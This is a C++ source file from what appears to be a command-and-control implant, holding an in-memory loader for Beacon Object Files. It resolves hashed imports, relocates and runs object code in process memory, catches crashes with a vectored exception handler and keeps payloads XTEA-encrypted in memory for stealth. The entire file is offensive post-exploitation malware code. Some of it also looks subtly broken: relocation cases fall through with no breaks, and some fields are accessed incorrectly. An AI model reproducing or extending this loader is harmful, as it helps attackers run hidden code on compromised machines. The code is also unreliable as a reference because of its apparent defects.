#include <core/include/objects.hpp>

using namespace Xtea;
using namespace Opsec;
using namespace Stream;
using namespace Memory::Methods;
using namespace Utils::Scanners;
using namespace Utils;

namespace Objects {

    PVOID DATA wrapper_return = nullptr;

    // TODO: add common BOF/internal implant functions
    HASH_MAP RDATA internal_map[] = {
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
    };

    HASH_MAP RDATA bof_map[] = {
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
        { .name = 0, .address = nullptr },
    };


    LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS exception) {

        _stream *stream = CreateTaskResponse(TypeError);

        exception->ContextRecord->IP_REG = U_PTR(wrapper_return);

        PackUint32(stream,   ERROR_UNHANDLED_EXCEPTION);
        PackUint32(stream,   exception->ExceptionRecord->ExceptionCode);
        PackPointer(stream, C_PTR(U_PTR(exception->ExceptionRecord->ExceptionAddress)));

        Dispatcher::MessageQueue(stream);

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    VOID WrapperFunction(void *address, void *args, size_t size) {

        auto function = (OBJ_ENTRY) address;

        wrapper_return = __builtin_extract_return_addr(__builtin_return_address(0));
        function((char*)args, size);
    }

    BOOL ProcessSymbol(char* sym_string, void** pointer) {

        char *function  = nullptr;

        *pointer = nullptr;
        // __imp_Beacon
        if (HashStringA(sym_string, COFF_PREP_BEACON_SIZE) == COFF_PREP_BEACON) {

            function = sym_string + COFF_PREP_BEACON_SIZE;
            return MapScan(bof_map, HashStringA(function, MbsLength(function)), pointer);
        }
        // __imp_
        if (HashStringA(sym_string, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
            bool import = SymbolScan(sym_string, '$', MbsLength(sym_string));

            if (import) {
                char buffer[MAX_PATH] = { };

                auto count = 0;
                auto split = NewSplit(sym_string + COFF_PREP_SYMBOL_SIZE, "$", &count);
#ifdef _M_IX86
                Trim(split[1], '@');
#endif
                auto lib_hash   = HashStringA(MbsToLower(buffer, split[0]), MbsLength(split[0]));
                auto fn_hash    = HashStringA(MbsToLower(buffer, split[1]), MbsLength(split[1]));

                FreeSplit(split, count);
                C_PTR_HASHES(*pointer, lib_hash, fn_hash);

                return *pointer ? true : false;
            }

            function = sym_string + COFF_PREP_SYMBOL_SIZE;
            Trim(function, '@');

            return MapScan(internal_map, HashStringA(function, MbsLength(function)), pointer);
        }
        // .refptr.__instance
        if (HashStringA(sym_string, MbsLength(sym_string)) == COFF_INSTANCE) {
            *pointer = (_hexane*) GLOBAL_OFFSET;
            return *pointer ? true : false;
        }

        return false;
    }

    BOOL ExecuteFunction(_executable* exe, const char *const entry, void *const args, const size_t size) {

        void *veh_handle = nullptr;
        void *entrypoint = nullptr;
        char *sym_name   = nullptr;

        bool success = true;

        // NOTE: register veh as execution safety net
        if (!(veh_handle = Ctx->nt.RtlAddVectoredExceptionHandler(1, &ExceptionHandler))) {
            success = false;
            goto defer;
        }

        const auto file_head = exe->nt_head->FileHeader;

        // NOTE: set section memory attributes
        for (auto sec_index = 0; sec_index < file_head.NumberOfSections; sec_index++) {
            const auto section  = SECTION_HEADER(exe->buffer, sec_index);

            if (section->SizeOfRawData > 0) {
                uint32_t protect = 0;

                switch (section->Characteristics & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)) {
                case PAGE_NOACCESS:         protect = PAGE_NOACCESS; break;
                case IMAGE_SCN_MEM_EXECUTE: protect = PAGE_EXECUTE; break;
                case IMAGE_SCN_MEM_READ:    protect = PAGE_READONLY; break;
                case IMAGE_SCN_MEM_WRITE:   protect = PAGE_WRITECOPY; break;
                case IMAGE_SCN_MEM_RX:      protect = PAGE_EXECUTE_READ; break;
                case IMAGE_SCN_MEM_WX:      protect = PAGE_EXECUTE_WRITECOPY; break;
                case IMAGE_SCN_MEM_RW:      protect = PAGE_READWRITE; break;
                case IMAGE_SCN_MEM_RWX:     protect = PAGE_EXECUTE_READWRITE; break;
                default:
                    success = false;
                    goto defer;
                }

                if ((section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED) == IMAGE_SCN_MEM_NOT_CACHED) {
                    protect |= PAGE_NOCACHE;
                }

                if (!NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), (void**) &exe->sec_map[sec_index].address, &exe->sec_map[sec_index].size, protect, nullptr))) {
                    success = false;
                    goto defer;
                }
            }
        }

        if (exe->fn_map->size) {
            if (!NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), (void**) &exe->fn_map->address, &exe->fn_map->size, PAGE_READONLY, nullptr))) {
                success = false;
                goto defer;
            }
        }

        // NOTE: get names from COFF symbol table and find entrypoint
        for (auto sym_index = 0; sym_index < file_head.NumberOfSymbols; sym_index++) {
            const auto symbols = exe->symbols;

            if (symbols[sym_index].First.Value[0]) {
                sym_name = symbols[sym_index].First.Name; // inlined
            }
            else {
                sym_name = (char*)(symbols + file_head.NumberOfSymbols) + symbols[sym_index].First.Value[1]; // not inlined
            }

            // NOTE: compare symbols to entry names / entrypoint
            if (MemCompare(sym_name, entry, MbsLength(entry)) == 0) {
                entrypoint = exe->sec_map[symbols[sym_index].SectionNumber - 1].address + symbols[sym_index].Value;

            }
        }

        // NOTE: find section where entrypoint can be found and assert is RX
        for (auto sec_index = 0; sec_index < file_head.NumberOfSections; sec_index++) {
            if (entrypoint >= exe->sec_map[sec_index].address && entrypoint < exe->sec_map[sec_index].address + exe->sec_map[sec_index].size) {

                const auto section = SECTION_HEADER(exe->buffer, sec_index);

                if ((section->Characteristics & IMAGE_SCN_MEM_EXECUTE) != IMAGE_SCN_MEM_EXECUTE) {
                    success = false;
                    goto defer;
                }
            }
        }

        WrapperFunction(entrypoint, args, size);

    defer:
        if (veh_handle) {
            Ctx->nt.RtlRemoveVectoredExceptionHandler(veh_handle);
        }

        return success;
    }

    BOOL BaseRelocation(_executable *exe) {

        char sym_name[9]    = { };
        char *name_ptr      = nullptr;

        uint32_t fn_count   = 0;
        bool success        = true;

        const auto buffer   = exe->buffer;
        const auto symbols  = exe->symbols;

        for (auto sec_index = 0; sec_index < exe->nt_head->FileHeader.NumberOfSections; sec_index++) {
            void *function = nullptr;

            const auto section  = SECTION_HEADER(buffer, sec_index);
            auto reloc = RELOC_SECTION(buffer, section);

            for (auto rel_index = 0; rel_index < section->NumberOfRelocations; rel_index++) {
                const auto head = &symbols[reloc->SymbolTableIndex];

                if (head->First.Value[0]) {
                    MemSet(sym_name, 0, 9);
                    MemCopy(sym_name, head->First.Name, 8);
                    name_ptr = sym_name;
                }
                else {
                    name_ptr = (char*) (symbols + exe->nt_head->FileHeader.NumberOfSymbols) + head->First.Value[1];
                }

                void *reloc_addr    = exe->sec_map[sec_index].address + reloc->VirtualAddress;
                void *sec_addr      = exe->sec_map[head->SectionNumber - 1].address;
                void *fn_addr       = exe->fn_map + (fn_count * sizeof(void*));

                if (!ProcessSymbol(name_ptr, &function)) {
                    success = false;
                    goto defer;
                }
#if _WIN64
                if (function) {
                    switch (reloc->Type) {
                        case IMAGE_REL_AMD64_REL32: {
                            *(void**) fn_addr       = function;
                            *(uint32_t*) reloc_addr = U_PTR(fn_addr) - U_PTR(reloc_addr) - sizeof(uint32_t);
                        }
                        default:
                            break;

                    }
                }
                else {
                    switch (reloc->Type) {
                        case IMAGE_REL_AMD64_REL32:     *(uint32_t*) reloc_addr = *(uint32_t*) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t);
                        case IMAGE_REL_AMD64_REL32_1:   *(uint32_t*) reloc_addr = *(uint32_t*) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t) - 1;
                        case IMAGE_REL_AMD64_REL32_2:   *(uint32_t*) reloc_addr = *(uint32_t*) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t) - 2;
                        case IMAGE_REL_AMD64_REL32_3:   *(uint32_t*) reloc_addr = *(uint32_t*) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t) - 3;
                        case IMAGE_REL_AMD64_REL32_4:   *(uint32_t*) reloc_addr = *(uint32_t*) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t) - 4;
                        case IMAGE_REL_AMD64_REL32_5:   *(uint32_t*) reloc_addr = *(uint32_t*) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t) - 5;
                        case IMAGE_REL_AMD64_ADDR32NB:  *(uint32_t*) reloc_addr = *(uint32_t*) reloc_addr + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t);
                        case IMAGE_REL_AMD64_ADDR64:    *(uint64_t*) reloc_addr = *(uint64_t*) reloc_addr + U_PTR(sec_addr);
                        default:
                            break;
                    }
                }
#else
                if (function) {
                    switch (reloc_addr->Type) {
                        case IMAGE_REL_I386_DIR32: {
                            *(void**) fn_addr       = function;
                            *(uint32_t*) reloc_addr = U_PTR(fn_addr);
                        }
                        default:
                            break;
                    }
                }
                else {
                    switch (reloc_addr->Type) {
                        case IMAGE_REL_I386_DIR32: *(uint32_t*)reloc_addr = (*(uint32_t*)reloc_addr) + U_PTR(sec_addr);
                        case IMAGE_REL_I386_REL32: *(uint32_t*)reloc_addr = (*(uint32_t*)reloc_addr) + U_PTR(sec_addr) - U_PTR(reloc_addr) - sizeof(uint32_t);
                        default:
                            break;
                    }
                }
#endif
                reloc += sizeof(_reloc);
            }
        }

        defer:
        return success;
    }

    SIZE_T GetFunctionMapSize(_executable *exe) {

        char sym_name[9]    = { };
        int counter         = 0;

        for (auto sec_index = 0; sec_index < exe->nt_head->FileHeader.NumberOfSections; sec_index++) {
            const auto section  = SECTION_HEADER(exe->buffer, sec_index);
            auto reloc          = RELOC_SECTION(exe->buffer, exe->section);

            for (auto rel_index = 0; rel_index < section->NumberOfRelocations; rel_index++) {
                const auto symbols  = exe->symbols;
                char *buffer        = nullptr;

                if (_coff_symbol *symbol = &symbols[reloc->SymbolTableIndex]; symbol->First.Value[0]) {
                    MemSet(sym_name, 0, sizeof(sym_name));
                    MemCopy(sym_name, symbol->First.Name, 8);
                    buffer = sym_name;
                }
                else {
                    buffer = RVA(char*, symbols, exe->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];
                }

                if (HashStringA(buffer, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
                    counter++;
                }

                reloc = reloc + sizeof(_reloc);
            }
        }

        return sizeof(void*) * counter;
    }

    VOID AddCoff(_coff_params *coff) {

        _coff_params *head = Ctx->coffs;

        if (ENCRYPTED) {
            XteaCrypt((uint8_t*) coff->data, coff->data_size, Ctx->config.session_key, true);
            XteaCrypt((uint8_t*) coff->args, coff->args_size, Ctx->config.session_key, true);
            XteaCrypt((uint8_t*) coff->entrypoint, coff->entrypoint_length, Ctx->config.session_key, true);
        }

        if (!Ctx->coffs) {
            Ctx->coffs = coff;
        }
        else {
            do {
                if (head->next) {
                    head = head->next;
                }
                else {
                    head->next = coff;
                    break;
                }
            }
            while (true);
        }
    }

    COFF_PARAMS* GetCoff(const uint32_t coff_id) {

        auto head = Ctx->coffs;
        // NOTE: coff_id will be a known name hash

        do {
            if (head) {
                if (head->coff_id == coff_id) {
                    if (ENCRYPTED) {
                        XteaCrypt((uint8_t*)head->data, head->data_size, Ctx->config.session_key, false);
                        XteaCrypt((uint8_t*)head->args, head->args_size, Ctx->config.session_key, false);
                        XteaCrypt((uint8_t*)head->entrypoint, head->entrypoint_length, Ctx->config.session_key, false);
                    }

                    return head;
                }

                head = head->next;
            }
            else {
                return nullptr;
            }
        }
        while (true);
    }

    VOID RemoveCoff(uint32_t coff_id) {

        _coff_params *prev = { };

        if (!coff_id) {
            return;
        }

        for (auto head = Ctx->coffs; head; head = head->next) {
            if (head->coff_id == coff_id) {

                if (prev) {
                    prev->next = head->next;
                }
                else {
                    Ctx->coffs = head->next;
                }

                MemSet(head->data, 0, head->data_size);
                MemSet(head->args, 0, head->args_size);
                MemSet(head->entrypoint, 0, head->entrypoint_length);

                Free(head->data);
                Free(head->args);
                Free(head->entrypoint);
                Free(head);

                return;
            }

            prev = head;
        }
    }

    VOID Cleanup(_executable *exe) {

        if (!exe || !exe->base) {
            return;
        }
        if (!NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), &exe->base, &exe->size, PAGE_READWRITE, nullptr))) {
            // LOG ERROR
            return;
        }

        MemSet(exe->base, 0, exe->size);

        void *pointer   = exe->base;
        size_t size     = exe->size;

        if (!NT_SUCCESS(ntstatus = Ctx->nt.NtFreeVirtualMemory(NtCurrentProcess(), &pointer, &size, MEM_RELEASE))) {
            // LOG ERROR
            return;
        }

        if (exe->sec_map) {
            ZeroFree(exe->sec_map, exe->nt_head->FileHeader.NumberOfSections * sizeof (IMAGE_SECTION_HEADER));
            exe->sec_map = nullptr;
        }

        ZeroFree(exe, sizeof(_executable));
    }

    VOID CoffLoader(char* entrypoint, void* data, void* args, size_t args_size) {
        // NOTE: sec_map seems to be the only thing that persists

        bool success        = true;
        _executable *exe    = CreateImageData((uint8_t*) data); ;

        x_assertb(exe->buffer    = (uint8_t*) data);
        x_assertb(exe->sec_map   = (_object_map*) Malloc(sizeof(void*) * sizeof(_object_map)));
        x_assertb(ImageCheckArch(exe));

        exe->fn_map->size = GetFunctionMapSize(exe);

        // NOTE: calculating address/size of sections before base relocation
        for (uint16_t sec_index = 0; sec_index < exe->nt_head->FileHeader.NumberOfSections; sec_index++) {
            const auto section = SECTION_HEADER(exe->buffer, sec_index);

            exe->size += section->SizeOfRawData;
            exe->size = (size_t) PAGE_ALIGN(exe->size);
        }

        exe->size += exe->fn_map->size;

        x_ntassertb(Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), &exe->base, exe->size, &exe->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
        auto next = (uint8_t*) exe->base;

        for (uint16_t sec_index = 0; sec_index < exe->nt_head->FileHeader.NumberOfSections; sec_index++) {
            const auto section = SECTION_HEADER(exe->buffer, sec_index);

            exe->sec_map[sec_index].size     = section->SizeOfRawData;
            exe->sec_map[sec_index].address  = next;

            next += exe->section->SizeOfRawData;
            next = PAGE_ALIGN(next);

            MemCopy(exe->sec_map[sec_index].address, RVA(PBYTE, exe->buffer, exe->section->SizeOfRawData), exe->section->SizeOfRawData);
        }

        // NOTE: function map goes after the section map ?
        exe->fn_map = (_object_map*) next;

        x_assertb(BaseRelocation(exe));
        x_assertb(ExecuteFunction(exe, entrypoint, args, args_size));

    defer:
        if (success) {
            // LOG SUCCESS?
        }
        else {
            // LOG ERROR
        }

        if (exe) {
            Cleanup(exe);
        }
    }

    VOID CoffThread(_coff_params *coff) {

        if (!coff->entrypoint || !coff->data) {
            return;
        }

        CoffLoader(coff->entrypoint, coff->data, coff->args, coff->args_size);
    }
}
